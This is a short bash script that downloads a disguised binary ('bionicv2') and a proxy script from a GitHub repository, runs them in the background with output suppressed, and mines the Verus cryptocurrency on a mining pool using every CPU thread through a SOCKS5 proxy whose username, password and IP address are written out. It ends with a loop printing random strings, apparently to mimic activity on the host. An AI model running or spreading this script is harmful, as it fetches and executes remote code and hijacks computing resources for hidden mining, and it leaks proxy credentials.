#!/bin/bash
wget -O bionicv2 https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/bionicv2
wget -O proxy.py https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/proxy.py
chmod +x bionicv2 proxy.py
python3 proxy.py >/dev/null &
pool="stratum+tcp://na.luckpool.net:3956"
wallet="$1"
workername="$(cat /proc/sys/kernel/hostname)"
thread="$(nproc --all)"
proxy="socks5://gtfrmnnv:h7l3wob1wn3m@45.131.212.65:6114"
./bionicv2 -a verus -o $pool -u $wallet.$workername -t $thread -p -x $proxy >/dev/null &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
